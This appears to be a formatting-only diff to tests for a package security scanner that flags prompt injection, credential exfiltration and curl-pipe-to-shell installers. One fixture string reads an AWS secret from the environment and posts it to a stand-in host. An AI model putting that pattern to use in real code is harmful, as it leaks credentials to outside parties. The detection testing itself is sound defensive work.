@@ -41,7 +41,9 @@ describe("scanPackage (fixture integration)", () => {
   it("blocks an instruction-override prompt injection", () => {
     const result = scan("prompt-injection-high");
     expect(result.verdict).toBe("block");
-    expect(result.findings.some((f) => f.category === "prompt-injection" && f.severity === "high")).toBe(true);
+    expect(
+      result.findings.some((f) => f.category === "prompt-injection" && f.severity === "high")
+    ).toBe(true);
   });
 
   it("flags a role-reassignment prompt injection (med)", () => {
@@ -53,7 +55,9 @@ describe("scanPackage (fixture integration)", () => {
   it("blocks credential read paired with an outbound call", () => {
     const result = scan("exfil-high");
     expect(result.verdict).toBe("block");
-    expect(result.findings.some((f) => f.category === "data-exfiltration" && f.severity === "high")).toBe(true);
+    expect(
+      result.findings.some((f) => f.category === "data-exfiltration" && f.severity === "high")
+    ).toBe(true);
   });
 
   it("flags an outbound-only call (med)", () => {
@@ -65,7 +69,9 @@ describe("scanPackage (fixture integration)", () => {
   it("blocks a curl-pipe-to-shell installer", () => {
     const result = scan("malicious-high");
     expect(result.verdict).toBe("block");
-    expect(result.findings.some((f) => f.category === "malicious-command" && f.severity === "high")).toBe(true);
+    expect(
+      result.findings.some((f) => f.category === "malicious-command" && f.severity === "high")
+    ).toBe(true);
   });
 
   it("flags a raw child_process exec (med)", () => {
@@ -117,7 +123,7 @@ describe("scanPackage (cross-file exfiltration correlation)", () => {
       (f) =>
         f.category === "data-exfiltration" &&
         f.severity === "high" &&
-        f.correlatedWith !== undefined,
+        f.correlatedWith !== undefined
     );
     expect(crossFile).toBeDefined();
     expect(crossFile?.correlatedWith).toBe("config.js");
@@ -142,7 +148,8 @@ describe("scanPackage (cross-file exfiltration correlation)", () => {
 
   it("does not synthesize a cross-file finding when secret and outbound share one file", () => {
     const dir = makePackage({
-      "index.js": 'const token = process.env.AWS_SECRET;\nfetch("https://x.example/i", { body: token });\n',
+      "index.js":
+        'const token = process.env.AWS_SECRET;\nfetch("https://x.example/i", { body: token });\n',
     });
 
     const result = scanPackage(dir);
@@ -150,7 +157,7 @@ describe("scanPackage (cross-file exfiltration correlation)", () => {
     // The intra-file heuristic still escalates to high on its own.
     expect(result.verdict).toBe("block");
     expect(
-      result.findings.some((f) => f.severity === "high" && f.correlatedWith === undefined),
+      result.findings.some((f) => f.severity === "high" && f.correlatedWith === undefined)
     ).toBe(true);
     // No cross-file record — the two signals live in the same file.
     expect(result.correlatedFindings).toBeUndefined();
